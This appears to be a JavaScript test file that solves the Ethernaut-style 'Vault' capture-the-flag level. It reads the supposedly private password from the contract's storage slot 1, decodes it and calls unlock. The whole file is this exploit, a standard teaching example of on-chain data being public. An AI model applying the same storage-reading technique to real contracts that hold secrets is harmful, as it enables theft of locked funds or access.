const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, challenge, attacker, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670")
    challenge = await ethers.getContractAt("Vault", challengeAddress)
})

it("solves the challenge", async function () {
    // password is at storage slot 1 => bool public locked is at pos 0
    const password = await ethers.provider.getStorageAt(challenge.address, 1)

    let strPassword = Buffer.from(password.slice(2), "hex")
    console.log("Get string using Buffer: ", `${strPassword}`)
    strPassword = ethers.utils.toUtf8String(password)
    console.log("Get string using toUtf8String: ", strPassword)

    console.log(`password = ${password} --- ${strPassword}`)

    tx = await challenge.unlock(password)
    await tx.wait()
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
